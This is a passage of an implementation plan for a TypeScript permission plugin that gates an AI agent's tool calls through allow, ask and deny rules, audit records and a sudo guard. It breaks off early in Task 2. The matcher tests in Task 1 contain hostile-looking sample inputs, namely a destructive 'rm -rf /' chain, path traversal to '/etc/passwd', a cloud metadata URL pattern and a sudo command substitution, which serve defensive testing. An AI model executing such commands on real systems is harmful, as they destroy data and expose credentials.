# AIR Permissions Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship `@air/dsh-permission-rules`, an out-of-tree plugin that decides every tool call from capability scopes and allow/ask/deny rules, answers direct approval requests from rules, records rule grants and human grants in an AIR audit file, adds `/allow` and `/deny`, and rejects plain `sudo` in the bash tool.

**Architecture:** One host-level Cordis plugin. A prepended `tools/pre-execute` listener calls `next()` first and then combines the downstream decision with its own verdict, so its result does not depend on listener order. A prepended `approval/request` listener answers asks that did not start in the policy listener (sandbox escalation, hooks) when an explicit allow rule covers the correlated call. Rules come from two places: the plugin's static Config and a JSON rules file under the harness home that `/allow` and `/deny` write atomically. A `ctx.tools.guard()` denies bash commands that call `sudo` without a password path that keeps the secret out of the session log. No session event type is added: decisions that leave no approval event are written to an AIR-owned JSONL audit file.

**Tech Stack:** TypeScript 6 (strict, ESM), Cordis 4, `@deepseek-ai/dsh-tools`, `@deepseek-ai/dsh-user-approval`, `@deepseek-ai/dsh-commands`, `@deepseek-ai/dsh-atomic-write`, `@deepseek-ai/dsh-home-paths`, Schemastery, picomatch 4, Vitest 4.

**Spec:** [spikes/04-memory-context-permissions.md](spikes/04-memory-context-permissions.md) §7 and §8-§10 (permissions rows); [spikes/02-file-conventions.md](spikes/02-file-conventions.md) §8; [spikes/05-voice-os-triggers-shell.md](spikes/05-voice-os-triggers-shell.md) §6 (sudo guard only); [spikes/01-toolchain.md](spikes/01-toolchain.md) (package templates, native Loader test); [research/research.md](../../research/research.md) §5.3; [research/notes/02-air-extraction.md](../../research/notes/02-air-extraction.md) §2.3; [research/notes/04-mcp-security.md](../../research/notes/04-mcp-security.md) §4 rows 3 and 5. Upstream APIs were read at tag `dsh-v0.2.0-rc.2`; line numbers below refer to that tag.

## Global Constraints

- Node `^22.19 || >=24`; pnpm `11.7.0`; ESM only; TypeScript strict.
- AIR packages live in `air/packages/<pkg>` and are named `@air/dsh-<pkg>`. dsh packages are peers with range `^0.2.0-rc.1` plus `link:../../../packages/<group>/<pkg>` devDependencies (vendor packages: `link:../../../vendor/<pkg>`). `workspace:*` is used only between AIR packages.
- Plan 00 (assumed done) provides `air/package.json` tools and recursive scripts (`build`, `typecheck`, `lint`, `test`, `smoke`), `air/tsconfig.base.json`, `air/.oxlintrc.json`, `air/.gitignore` (ignores `lib/`, `coverage/`, `.loader-*/`), and `air/scripts/smoke-profile.sh`.
- Plan 01 (assumed done through its Task 2) provides `@air/dsh-convention-core`. This plan imports `toDshToolName`, `expandHome`, and `isRecord` from it and defines no tool-name table of its own.
- Test command: `pnpm -C air/packages/<pkg> test`. Coverage command: `pnpm -C air/packages/<pkg> exec vitest run --coverage --coverage.include='src/**' --coverage.thresholds.100`.
- Build order: the root `pnpm run build` must be finished; `pnpm -C air/packages/convention-core build` must run before this package's tests; the native Loader test imports this package's own `lib/`, so run `pnpm -C air/packages/permission-rules build` before it.
- Registrations are effects (`ctx.on`, `ctx.effect`, registry `register()`/`guard()` return the disposer). Deployment-varying choices are Config fields, not constants. Misconfiguration fails loud. Opaque cross-boundary ids are branded. No `as unknown` casts. Waterfall listeners call `next()`.
- NO new session event types. Audit data goes to files under `dshHomePath('air', ...)`.
- Client UI copy, when a later plan adds a client, goes through typed locale dictionaries registered with `ctx.locale.register(ns, { zh, en })`. This plan ships no client code; the only localized text is the `displayReason` of an ask, which carries `en` and `zh`.
- The package has a `README.md` with Summary, Model Experience, and Known Limitations sections (English), and JSDoc on every export.
- Markdown written by this plan never uses the banned origin-label word from the root `AGENTS.md` ("Ban ..." rule), contains no git commit hashes, and no URLs under the upstream organisation's GitHub path.
- Any edit outside `air/` and `research/` is recorded in `air/UPSTREAM-DELTA.md`. Goal for this plan: none.

## Decisions fixed by this plan

1. **Rules live in a file, not in volatile Config.** `/allow` and `/deny` write `dshHomePath('air', 'permissions.json')` under a file lock with an atomic rename. Static rules can also be listed in the plugin's Config. Spike 04 §7.2 proposed a `.volatile()` Config field written through `ctx.remote.settings.mutate`; that path belongs with the Web "Always allow" button and is a follow-up plan.
2. **The listener always calls `next()` first.** Spike 02 §8.2 sketched an `allow` that returns without `next()`, which would skip later listeners. This plan never does that: an AIR allow can only replace a downstream `ask`, never a downstream `deny` or `cancel`, and `ctx.tools.guard()` checks still run afterwards.
3. **Combination order is `deny > cancel > ask > allow`**, with one exception: an explicit AIR allow rule satisfies a downstream `ask` (Config `ruleAllowSatisfiesAsk`, default `true`). A capability default of `allow` never satisfies a downstream `ask`.
4. **Capability table.** `capabilities` maps a capability id to `{ risk, default }`; `tools` maps a tool name to `{ capability, scopeArgKeys, pathKeys, commandKeys }`. `scopeArgKeys` is mandatory and non-empty for every `tools` entry; the plugin fails at load otherwise. AIR's `install_time` confirmation maps to default `allow`, `per_call` to default `ask`. The five rows that research note 02 §2.3 records from AIR are kept by id (`fs.read`, `fs.write`, `shell.execute`, `browser.execute_script`, `system.device_control`); `net.fetch` and `net.search` are added for the harness tools. The rest of AIR's 15-row table is not in this checkout; rows are Config data, so adding them later needs no code.
5. **Unscoped tools.** A tool with no `tools` entry gets `unscopedDefault` (default `allow`, which is upstream behavior) unless its name starts with `mcp__`, which gets `unscopedMcpDefault` (default `ask`).
6. **Unknown tool names in `tools` are not rejected at load.** Tools register per Agent (inside the agent preset) and MCP tools arrive later, so a host-level row cannot know the full set when it loads. The entry is inert until a tool with that name is called.
7. **Rule matching.** A rule names exactly one of `tool` or `capability`, plus an optional `match` map from argument name to pattern. Patterns on a `pathKeys` argument are globs (picomatch, `dot: true`) compared after both sides are resolved against the session `cwd`. Patterns on other arguments use `*` as "any characters"; a pattern starting with `domain:` compares the URL host. For a `commandKeys` argument the command line is split into segments: a `deny` or `ask` rule matches when the whole line or any segment matches; an `allow` rule matches only when every segment matches, so `git status*` does not allow `git status && rm -rf /`.
8. **`Tool(pattern)` syntax** is accepted by `/allow` and `/deny`. The tool name is translated with `toDshToolName` from `@air/dsh-convention-core`; a lowercase dsh name is accepted as is. The pattern binds to the tool's first `scopeArgKeys` entry. A trailing `:*` (Claude Code prefix form) becomes `*`.
9. **The audit file records** every AIR deny, every AIR ask, every rule grant, and the human outcome of every approval request whose call the plugin saw. Capability-default allows are recorded only with `auditDefaultAllows: true`. Arguments are not written; a SHA-256 digest of the canonical arguments is.
10. **A rule grant that cannot be audited is not applied.** If the audit append fails, an allow-over-ask or a rule answer to a direct ask falls back to the downstream ask or the human answerer.
11. **The sudo check is a guard, not a rule.** Guards run after the waterfall and cannot be overridden, so an allow rule for `bash` cannot re-enable `sudo`. `sudo -A`, `sudo --askpass`, and `sudo -n` pass; anything else that starts a segment with `sudo` is denied. `pkexec` and the `privileged_run` tool are a later plan.

## File Structure

```
air/packages/permission-rules/
  package.json
  tsconfig.build.json
  tsconfig.json
  tsdown.config.ts
  vitest.config.ts
  README.md
  src/
    types.ts          Branded RuleId, Decision, Risk, table and rule types, Verdict
    match.ts          Wildcard, domain, and path matchers; shell command splitter
    taxonomy.ts       Default capability table and default tool scopes (data)
    rule-syntax.ts    Tool(pattern) parser and rule formatter
    policy.ts         compilePolicy, evaluate, combine
    rule-store.ts     permissions.json reader/writer (lock + atomic write)
    policy-source.ts  Merges Config rules and file rules; recompiles on file change
    audit.ts          AuditRecord, AuditLog (serialized JSONL append), argsDigest
    sudo.ts           sudo detection and guard reason
    reason.ts         Deny/ask reason text
    pending.ts        Bounded callId -> call facts map shared by both listeners
    config.ts         Config schema, Config type, resolveConfig
    commands.ts       /allow and /deny command definitions
    index.ts          Plugin: listeners, guard, command registration
  tests/
    match.spec.ts
    rule-syntax.spec.ts
    policy.spec.ts
    rule-store.spec.ts
    policy-source.spec.ts
    audit.spec.ts
    sudo.spec.ts
    reason.spec.ts
    pending.spec.ts
    harness.ts        Shared in-process composition for plugin tests
    plugin.spec.ts
    answerer.spec.ts
    commands.spec.ts
    native-loader.spec.ts
air/bundles/air/package.json        (modified: dependency)
air/bundles/air/cordis.patch.yml    (modified: host row)
air/README.md                       (modified: permissions paragraph)
```

Upstream APIs this plan calls (all at `dsh-v0.2.0-rc.2`):

| API | Location |
|---|---|
| `'tools/pre-execute'(exec: ToolExecution, next: () => Promise<PreToolDecision>): Promise<PreToolDecision>`, waterfall | `packages/core/tools/src/index.ts:153` |
| `PreToolDecision = { kind: 'allow' } \| { kind: 'deny'; reason: string; info?: ToolErrorInfo } \| { kind: 'cancel' } \| { kind: 'ask'; reason?: string; displayReason?: { readonly en: string; readonly [locale: string]: string } }` | same file, `:607` |
| `ToolExecution` fields `callId`, `name`, `arguments: unknown`, `agent?`, `signal` | same file, `:326-398` |
| `ToolErrorInfo { name: string; code: string; reason?: string }` | same file, `:489` |
| `ctx.tools.guard(guard: (execution: Readonly<ToolExecution>) => string \| undefined): () => void` | same file, `:1136` |
| `'tools/result'(exec, result): undefined`, emit | same file, `:198` |
| `ctx.tools.execute({ name, arguments, callId, agent?, signal })` returning `ToolExecutionResult` (`isError`, `content`, `error?.info`) | same file, `:572-593` |
| `defineContentToolFixture({ name, description, parameters, execute })` (test fixture) | `packages/core/tools/src/testing.ts:27` |
| `'approval/request'(req: ApprovalRequestEvent, next: () => Promise<ApprovalOutcome>): Promise<ApprovalOutcome>`, waterfall; `ApprovalOutcome = 'allowed-once' \| 'rejected' \| 'cancelled' \| 'unavailable'` | `packages/interaction/user-approval/src/types.ts:32-91` |
| `ctx.approval.request({ agent, toolName, callId?, reason?, signal? })`; requires an open turn | `packages/interaction/user-approval/src/index.ts:215` |
| `ctx.commands.register(definition: CommandDefinition): () => void`; `ctx.commands.execute(agent, text, attachments, signal)`; `CommandResult = { kind: 'success'; text?: string } \| { kind: 'error'; text: string }` | `packages/interaction/commands/src/index.ts:285,361`, `src/types.ts:34` |
| `writeFileAtomic(filename, content, { mode, dirMode? }): Promise<void>`; `withFileLock(filename, operation, options?): Promise<T>` | `packages/util/atomic-write/src/index.ts:79,235` |
| `dshHomePath(...segments: string[]): string` | `packages/util/home-paths/src/index.ts:98` |
| `agent.session.header.cwd?: string`, `agent.session.id` | `packages/core/session/src/types.ts:105`, `src/index.ts:463` |

---

### Task 1: Package scaffold, types, default tables, and matchers

**Files:**
- Create: `air/packages/permission-rules/package.json`
- Create: `air/packages/permission-rules/tsconfig.build.json`
- Create: `air/packages/permission-rules/tsconfig.json`
- Create: `air/packages/permission-rules/tsdown.config.ts`
- Create: `air/packages/permission-rules/vitest.config.ts`
- Create: `air/packages/permission-rules/src/types.ts`
- Create: `air/packages/permission-rules/src/taxonomy.ts`
- Create: `air/packages/permission-rules/src/match.ts`
- Test: `air/packages/permission-rules/tests/match.spec.ts`

**Interfaces:**
- Consumes from `@air/dsh-convention-core` (plan 01 Task 1): `expandHome(path: string, home?: string): string`. From upstream: `Branded<B>` (`@deepseek-ai/dsh-brand`).
- Produces:
  - `types.ts`: `type RuleId = Branded<'AirPermissionRuleId'>`, `RuleId(id: string): RuleId`, `type Decision = 'allow' | 'ask' | 'deny'`, `type Risk = 'low' | 'medium' | 'high'`, `interface CapabilitySpec { readonly risk: Risk; readonly default: Decision }`, `interface ToolScope { readonly capability: string; readonly scopeArgKeys: readonly string[]; readonly pathKeys: readonly string[]; readonly commandKeys: readonly string[] }`, `interface RuleInput { readonly id: string; readonly decision: Decision; readonly tool?: string | undefined; readonly capability?: string | undefined; readonly match?: Readonly<Record<string, string>> | undefined }`, `interface PolicyTables { readonly capabilities: Readonly<Record<string, CapabilitySpec>>; readonly tools: Readonly<Record<string, ToolScope>>; readonly unscopedDefault: Decision; readonly unscopedMcpDefault: Decision }`, `interface CallFacts { readonly tool: string; readonly args: Readonly<Record<string, unknown>>; readonly cwd: string | undefined }`, `interface Verdict { readonly decision: Decision; readonly source: 'rule' | 'capability-default' | 'unscoped-default'; readonly ruleId?: RuleId; readonly scope?: { readonly capability: string; readonly risk: Risk } }`.
  - `taxonomy.ts`: `defaultCapabilities(): Record<string, CapabilitySpec>`, `defaultToolScopes(): Record<string, ToolScope>`.
  - `match.ts`: `wildcardToRegExp(pattern: string): RegExp`, `matchDomain(domain: string, value: string): boolean`, `matchText(pattern: string, value: string): boolean`, `resolveScopePath(value: string, cwd: string | undefined, home?: string): string | undefined`, `matchPath(pattern: string, value: string, cwd: string | undefined, home?: string): boolean`, `splitCommand(command: string): string[]`.

- [ ] **Step 1: Create the package scaffold**

`air/packages/permission-rules/package.json`:

```json
{
  "name": "@air/dsh-permission-rules",
  "description": "Capability scopes, allow/ask/deny rules, rule-based approval answers, and an audit file for tool calls",
  "version": "0.1.0",
  "private": true,
  "type": "module",
  "license": "MIT",
  "main": "lib/index.js",
  "types": "lib/types/index.d.ts",
  "exports": {
    ".": {
      "types": "./lib/types/index.d.ts",
      "default": "./lib/index.js"
    },
    "./package.json": "./package.json"
  },
  "files": [
    "lib/index.js",
    "lib/types/**/*.d.ts"
  ],
  "scripts": {
    "build": "tsc -p tsconfig.build.json && tsdown",
    "typecheck": "tsc -p tsconfig.json",
    "test": "vitest run"
  },
  "dependencies": {
    "@air/dsh-convention-core": "workspace:*",
    "@deepseek-ai/schemastery": "link:../../../vendor/schemastery",
    "picomatch": "^4.0.4"
  },
  "peerDependencies": {
    "@deepseek-ai/cordis": "^4.0.4",
    "@deepseek-ai/dsh-agent": "^0.2.0-rc.1",
    "@deepseek-ai/dsh-atomic-write": "^0.2.0-rc.1",
    "@deepseek-ai/dsh-brand": "^0.2.0-rc.1",
    "@deepseek-ai/dsh-commands": "^0.2.0-rc.1",
    "@deepseek-ai/dsh-home-paths": "^0.2.0-rc.1",
    "@deepseek-ai/dsh-session": "^0.2.0-rc.1",
    "@deepseek-ai/dsh-tools": "^0.2.0-rc.1",
    "@deepseek-ai/dsh-user-approval": "^0.2.0-rc.1"
  },
  "devDependencies": {
    "@deepseek-ai/cordis": "link:../../../vendor/cordis",
    "@deepseek-ai/cordis-plugin-include": "link:../../../vendor/include",
    "@deepseek-ai/cordis-plugin-loader": "link:../../../vendor/loader",
    "@deepseek-ai/dsh-agent": "link:../../../packages/core/agent",
    "@deepseek-ai/dsh-atomic-write": "link:../../../packages/util/atomic-write",
    "@deepseek-ai/dsh-brand": "link:../../../packages/util/brand",
    "@deepseek-ai/dsh-commands": "link:../../../packages/interaction/commands",
    "@deepseek-ai/dsh-home-paths": "link:../../../packages/util/home-paths",
    "@deepseek-ai/dsh-llm": "link:../../../packages/llm/llm",
    "@deepseek-ai/dsh-session": "link:../../../packages/core/session",
    "@deepseek-ai/dsh-system-prompt": "link:../../../packages/core/system-prompt",
    "@deepseek-ai/dsh-tools": "link:../../../packages/core/tools",
    "@deepseek-ai/dsh-user-approval": "link:../../../packages/interaction/user-approval",
    "@types/picomatch": "^4.0.2"
  }
}
```

`air/packages/permission-rules/tsconfig.build.json`:

```json
{
  "extends": "../../tsconfig.base.json",
  "compilerOptions": { "rootDir": "src", "outDir": "lib/types" },
  "include": ["src"]
}
```

`air/packages/permission-rules/tsconfig.json`:

```json
{
  "extends": "./tsconfig.build.json",
  "compilerOptions": { "rootDir": ".", "noEmit": true },
  "include": ["src", "tests"]
}
```

`air/packages/permission-rules/tsdown.config.ts`:

```ts
import { defineConfig } from 'tsdown'

/** Bundle the tsc output into one ESM entry; dsh packages and dependencies stay external. */
export default defineConfig({
  entry: ['lib/types/index.js'],
  outDir: 'lib',
  format: ['esm'],
  platform: 'node',
  target: 'es2024',
  fixedExtension: false,
  dts: false,
  clean: false,
})
```

`air/packages/permission-rules/vitest.config.ts`:

```ts
import { defineConfig } from 'vitest/config'

export default defineConfig({
  test: {
    include: ['tests/**/*.spec.ts'],
    testTimeout: 20_000,
  },
})
```

Run: `pnpm -C /home/hxman/AIR-harness/air install && pnpm -C /home/hxman/AIR-harness/air/packages/convention-core build`
Expected: both exit 0; `air/packages/permission-rules/node_modules/picomatch/package.json` and `air/packages/convention-core/lib/index.js` exist.

- [ ] **Step 2: Write the types and the default tables**

`air/packages/permission-rules/src/types.ts`:

```ts
/** Shared types of the AIR permission policy. */
import type { Branded } from '@deepseek-ai/dsh-brand'

/** Identity of one permission rule, unique across the Config rules and the rules file. */
export type RuleId = Branded<'AirPermissionRuleId'>

/**
 * Brand a string as a {@link RuleId}.
 * @param id - raw rule id.
 * @returns the same string carrying the brand.
 */
export function RuleId(id: string): RuleId {
  return id as RuleId
}

/** What the policy does with a call. */
export type Decision = 'allow' | 'ask' | 'deny'

/** Risk class of a capability, shown in approval prompts and audit records. */
export type Risk = 'low' | 'medium' | 'high'

/** One capability: its risk class and the decision used when no rule matches. */
export interface CapabilitySpec {
  readonly risk: Risk
  readonly default: Decision
}

/** Capability scope of one tool and the arguments that define that scope. */
export interface ToolScope {
  /** Key of the capability table. */
  readonly capability: string
  /** Arguments that define the scope; never empty. */
  readonly scopeArgKeys: readonly string[]
  /** Members of `scopeArgKeys` that hold filesystem paths. */
  readonly pathKeys: readonly string[]
  /** Members of `scopeArgKeys` that hold shell command lines. */
  readonly commandKeys: readonly string[]
}

/** One rule as written in Config or in the rules file. */
export interface RuleInput {
  readonly id: string
  readonly decision: Decision
  /** dsh tool name; exactly one of `tool` and `capability` is set. */
  readonly tool?: string | undefined
  /** Capability id; exactly one of `tool` and `capability` is set. */
  readonly capability?: string | undefined
  /** Argument name to pattern; every entry must match. Absent or empty matches every call. */
  readonly match?: Readonly<Record<string, string>> | undefined
}

/** The tables a policy is compiled from. */
export interface PolicyTables {
  readonly capabilities: Readonly<Record<string, CapabilitySpec>>
  readonly tools: Readonly<Record<string, ToolScope>>
  /** Decision for a tool without a `tools` entry. */
  readonly unscopedDefault: Decision
  /** Decision for an `mcp__*` tool without a `tools` entry. */
  readonly unscopedMcpDefault: Decision
}

/** The facts of one tool call that the policy reads. */
export interface CallFacts {
  readonly tool: string
  readonly args: Readonly<Record<string, unknown>>
  /** Session working directory; relative path arguments resolve against it. */
  readonly cwd: string | undefined
}

/** The policy's decision for one call and where it came from. */
export interface Verdict {
  readonly decision: Decision
  readonly source: 'rule' | 'capability-default' | 'unscoped-default'
  /** Set when `source` is `'rule'`. */
  readonly ruleId?: RuleId
  /** Capability and risk of the tool, when it has a `tools` entry. */
  readonly scope?: { readonly capability: string; readonly risk: Risk }
}
```

`air/packages/permission-rules/src/taxonomy.ts`:

```ts
/** Default capability table and default tool scopes. Both are Config defaults, not fixed policy. */
import type { CapabilitySpec, ToolScope } from './types.ts'

/**
 * Default capability table. `fs.read`, `fs.write`, `shell.execute`,
 * `browser.execute_script`, and `system.device_control` keep the ids and risk
 * classes of the earlier AIR project; its `install_time` confirmation maps to
 * `allow` and `per_call` to `ask`.
 * @returns a fresh mutable table.
 */
export function defaultCapabilities(): Record<string, CapabilitySpec> {
  return {
    'fs.read': { risk: 'low', default: 'allow' },
    'fs.write': { risk: 'medium', default: 'ask' },
    'shell.execute': { risk: 'high', default: 'ask' },
    'net.fetch': { risk: 'medium', default: 'ask' },
    'net.search': { risk: 'low', default: 'allow' },
    'browser.execute_script': { risk: 'high', default: 'ask' },
    'system.device_control': { risk: 'medium', default: 'ask' },
  }
}

/**
 * Default scopes of the harness tools, keyed by dsh tool name.
 * @returns a fresh mutable table.
 */
export function defaultToolScopes(): Record<string, ToolScope> {
  return {
    bash: { capability: 'shell.execute', scopeArgKeys: ['command'], pathKeys: [], commandKeys: ['command'] },
    read: { capability: 'fs.read', scopeArgKeys: ['file_path'], pathKeys: ['file_path'], commandKeys: [] },
    write: { capability: 'fs.write', scopeArgKeys: ['file_path'], pathKeys: ['file_path'], commandKeys: [] },
    edit: { capability: 'fs.write', scopeArgKeys: ['file_path'], pathKeys: ['file_path'], commandKeys: [] },
    glob: { capability: 'fs.read', scopeArgKeys: ['path'], pathKeys: ['path'], commandKeys: [] },
    grep: { capability: 'fs.read', scopeArgKeys: ['path'], pathKeys: ['path'], commandKeys: [] },
    web_fetch: { capability: 'net.fetch', scopeArgKeys: ['url'], pathKeys: [], commandKeys: [] },
    web_search: { capability: 'net.search', scopeArgKeys: ['query'], pathKeys: [], commandKeys: [] },
  }
}
```

- [ ] **Step 3: Write the failing matcher tests**

`air/packages/permission-rules/tests/match.spec.ts`:

```ts
import { describe, expect, it } from 'vitest'
import {
  matchDomain,
  matchPath,
  matchText,
  resolveScopePath,
  splitCommand,
  wildcardToRegExp,
} from '../src/match.ts'

describe('wildcardToRegExp', () => {
  it('treats * as any characters, including slashes and newlines', () => {
    expect(wildcardToRegExp('git status*').test('git status -s src/a.ts')).toBe(true)
    expect(wildcardToRegExp('a*b').test('a\nb')).toBe(true)
  })

  it('anchors both ends and escapes regular-expression characters', () => {
    expect(wildcardToRegExp('npm test').test('npm test -- x')).toBe(false)
    expect(wildcardToRegExp('a.b').test('axb')).toBe(false)
    expect(wildcardToRegExp('f(x)[1]+?^$|{}\\').test('f(x)[1]+?^$|{}\\')).toBe(true)
  })
})

describe('matchDomain', () => {
  it('matches the host and its subdomains', () => {
    expect(matchDomain('example.com', 'https://example.com/a')).toBe(true)
    expect(matchDomain('Example.com', 'https://api.example.com/a')).toBe(true)
  })

  it('rejects other hosts, lookalikes, non-URLs, and an empty domain', () => {
    expect(matchDomain('example.com', 'https://notexample.com/')).toBe(false)
    expect(matchDomain('example.com', 'https://example.com.evil.test/')).toBe(false)
    expect(matchDomain('example.com', 'not a url')).toBe(false)
    expect(matchDomain('', 'https://example.com/')).toBe(false)
  })
})

describe('matchText', () => {
  it('uses the domain matcher for a domain: pattern', () => {
    expect(matchText('domain:example.com', 'https://docs.example.com/x')).toBe(true)
    expect(matchText('domain:example.com', 'https://other.test/x')).toBe(false)
  })

  it('uses the wildcard matcher otherwise', () => {
    expect(matchText('http://169.254.*', 'http://169.254.169.254/latest')).toBe(true)
    expect(matchText('http://169.254.*', 'https://example.com')).toBe(false)
  })
})

describe('resolveScopePath', () => {
  it('normalizes absolute paths and expands the home directory', () => {
    expect(resolveScopePath('/ws/a/../b', undefined)).toBe('/ws/b')
    expect(resolveScopePath('~/notes', undefined, '/home/u')).toBe('/home/u/notes')
  })

  it('resolves a relative path against cwd and returns undefined without one', () => {
    expect(resolveScopePath('src/a.ts', '/ws')).toBe('/ws/src/a.ts')
    expect(resolveScopePath('src/a.ts', undefined)).toBeUndefined()
  })
})

describe('matchPath', () => {
  it('matches globs after resolving both sides', () => {
    expect(matchPath('./src/**', 'src/a/b.ts', '/ws')).toBe(true)
    expect(matchPath('./src/**', '/ws/src/a/b.ts', '/ws')).toBe(true)
    expect(matchPath('~/notes/*.md', '/home/u/notes/a.md', undefined, '/home/u')).toBe(true)
    expect(matchPath('/ws/**', '/ws/.env', undefined)).toBe(true)
  })

  it('rejects paths that leave the pattern root', () => {
    expect(matchPath('./src/**', '../etc/passwd', '/ws')).toBe(false)
    expect(matchPath('./src/**', 'src/../../etc/passwd', '/ws')).toBe(false)
  })

  it('does not match when either side cannot be resolved', () => {
    expect(matchPath('src/**', '/ws/src/a.ts', undefined)).toBe(false)
    expect(matchPath('/ws/**', 'src/a.ts', undefined)).toBe(false)
  })
})

describe('splitCommand', () => {
  it('splits on command separators', () => {
    expect(splitCommand('git status && rm -rf /')).toEqual(['git status', 'rm -rf /'])
    expect(splitCommand('a; b | c || d\ne & f')).toEqual(['a', 'b', 'c', 'd', 'e', 'f'])
    expect(splitCommand('(cd x; ls)')).toEqual(['cd x', 'ls'])
  })

  it('keeps separators inside quotes and after a backslash', () => {
    expect(splitCommand('echo "a; b" | wc -l')).toEqual(['echo "a; b"', 'wc -l'])
    expect(splitCommand('echo \'x && y\'')).toEqual(['echo \'x && y\''])
    expect(splitCommand('echo a\;b')).toEqual(['echo a\;b'])
    expect(splitCommand('echo a\\')).toEqual(['echo a\\'])
  })

  it('keeps redirections that use an ampersand', () => {
    expect(splitCommand('npm test 2>&1')).toEqual(['npm test 2>&1'])
    expect(splitCommand('npm test &>out.log')).toEqual(['npm test &>out.log'])
  })

  it('starts a segment at a command substitution, also inside double quotes', () => {
    expect(splitCommand('echo $(whoami)')).toEqual(['echo', 'whoami'])
    expect(splitCommand('echo `whoami`')).toEqual(['echo', 'whoami'])
    expect(splitCommand('echo "$(sudo id)"')).toEqual(['echo "', 'sudo id)"'])
  })

  it('returns no segments for blank input', () => {
    expect(splitCommand('  ')).toEqual([])
  })
})
```

- [ ] **Step 4: Run the tests to verify they fail**

Run: `pnpm -C /home/hxman/AIR-harness/air/packages/permission-rules test`
Expected: FAIL; Vitest reports that `../src/match.ts` cannot be resolved.

- [ ] **Step 5: Write the matchers**

`air/packages/permission-rules/src/match.ts`:

```ts
/** Argument matchers for permission rules: wildcard text, URL hosts, resolved paths, and shell command segments. */
import { isAbsolute, resolve } from 'node:path'
import picomatch from 'picomatch'
import { expandHome } from '@air/dsh-convention-core'

const DOMAIN_PREFIX = 'domain:'
const REGEXP_SPECIAL = /[.+?^${}()|[\]\\]/
const SEPARATORS = ';&|()\n'

/**
 * Compile a wildcard pattern in which `*` matches any run of characters.
 * @param pattern - literal text with optional `*` wildcards.
 * @returns an anchored regular expression.
 */
export function wildcardToRegExp(pattern: string): RegExp {
  let source = ''
  for (const char of pattern) {
    if (char === '*') source += '.*'
    else source += REGEXP_SPECIAL.test(char) ? `\\${char}` : char
  }
  return new RegExp(`^${source}$`, 's')
}

/**
 * Compare a URL's host with a domain.
 * @param domain - host name without scheme, for example `example.com`.
 * @param value - the URL argument of a call.
 * @returns true when the URL parses and its host is the domain or one of its subdomains.
 */
export function matchDomain(domain: string, value: string): boolean {
  const wanted = domain.toLowerCase()
  if (wanted === '' || !URL.canParse(value)) return false
  const host = new URL(value).hostname.toLowerCase()
  return host === wanted || host.endsWith(`.${wanted}`)
}

/**
 * Match one non-path argument value.
 * @param pattern - `domain:<host>` or a wildcard pattern.
 * @param value - the argument value.
 * @returns whether the value matches.
 */
export function matchText(pattern: string, value: string): boolean {
  if (pattern.startsWith(DOMAIN_PREFIX)) return matchDomain(pattern.slice(DOMAIN_PREFIX.length), value)
  return wildcardToRegExp(pattern).test(value)
}

/**
 * Resolve a path or path pattern lexically. Symbolic links are not followed.
 * @param value - absolute, `~`-prefixed, or relative path.
 * @param cwd - session working directory for relative paths.
 * @param home - home directory override for tests.
 * @returns the normalized absolute path, or undefined for a relative path without `cwd`.
 */
export function resolveScopePath(value: string, cwd: string | undefined, home?: string): string | undefined {
  const expanded = expandHome(value, home)
  if (isAbsolute(expanded)) return resolve(expanded)
  return cwd === undefined ? undefined : resolve(cwd, expanded)
}

/**
 * Match a path argument against a glob.
 * @param pattern - glob, resolved like the value.
 * @param value - the path argument of a call.
 * @param cwd - session working directory.
 * @param home - home directory override for tests.
 * @returns whether the resolved value matches the resolved glob; false when either side cannot be resolved.
 */
export function matchPath(pattern: string, value: string, cwd: string | undefined, home?: string): boolean {
  const absolutePattern = resolveScopePath(pattern, cwd, home)
  const absoluteValue = resolveScopePath(value, cwd, home)
  if (absolutePattern === undefined || absoluteValue === undefined) return false
  return picomatch(absolutePattern, { dot: true })(absoluteValue)
}

/**
 * Split a shell command line into simple-command segments. Separators are
 * `;`, `&`, `|`, parentheses, and newlines outside quotes; a command
 * substitution (`$(` or a backquote) starts a segment anywhere outside single
 * quotes. The split is conservative: it may cut a segment that a shell would
 * keep whole, which makes an allow rule stricter, never looser.
 * @param command - the command line.
 * @returns trimmed non-empty segments in source order.
 */
export function splitCommand(command: string): string[] {
  const segments: string[] = []
  let current = ''
  let quote: '"' | '\'' | undefined
  const flush = (): void => {
    const trimmed = current.trim()
    if (trimmed !== '') segments.push(trimmed)
    current = ''
  }
  for (let index = 0; index < command.length; index += 1) {
    const char = command.charAt(index)
    const next = command.charAt(index + 1)
    if (quote === '\'') {
      if (char === '\'') quote = undefined
      current += char
    } else if (char === '\\' && next !== '') {
      current += char + next
      index += 1
    } else if (char === '`' || (char === '$' && next === '(')) {
      flush()
      if (char === '$') index += 1
    } else if (quote === '"') {
      if (char === '"') quote = undefined
      current += char
    } else if (char === '"' || char === '\'') {
      quote = char
      current += char
    } else if (char === '&' && (current.endsWith('>') || next === '>')) {
      current += char
    } else if (SEPARATORS.includes(char)) {
      flush()
    } else {
      current += char
    }
  }
  flush()
  return segments
}
```

- [ ] **Step 6: Run the tests to verify they pass**

Run: `pnpm -C /home/hxman/AIR-harness/air/packages/permission-rules test`
Expected: `Test Files 1 passed (1)`.

- [ ] **Step 7: Typecheck**

Run: `pnpm -C /home/hxman/AIR-harness/air/packages/permission-rules typecheck`
Expected: exit 0, no output from `tsc`.

- [ ] **Step 8: Commit**

```bash
cd /home/hxman/AIR-harness
git add air/pnpm-lock.yaml air/packages/permission-rules
git commit -m "feat(air): scaffold permission-rules with scope tables and argument matchers"
```

---

### Task 2: `Tool(pattern)` syntax and policy evaluation

**Files:**
- Create: `air/packages/permission-rules/src/rule-syntax.ts`
- Create: `air/packages/permission-rules/src/policy.ts`
- Test: `air/packages/permission-rules/tests/rule-syntax.spec.ts`
- Test: `air/packages/permission-rules/tests/policy.spec.ts`

**Interfaces:**
- Consumes from Task 1: every type in `types.ts`; `matchText`, `matchPath`, `splitCommand`. From `@air/dsh-convention-core` (plan 01 Task 1): `toDshToolName(claudeName: string): string | undefined` (returns `mcp__*` names unchanged, `undefined` for names outside its table).
- Produces:
  - `rule-syntax.ts`: `interface ParsedRuleSpec { readonly tool: string; readonly match?: Record<string, string> }`, `parseRuleSpec(spec: string, tools: Readonly<Record<string, ToolScope>>): ParsedRuleSpec` (throws `Error` with a user-facing message), `formatRule(rule: RuleInput): string`.
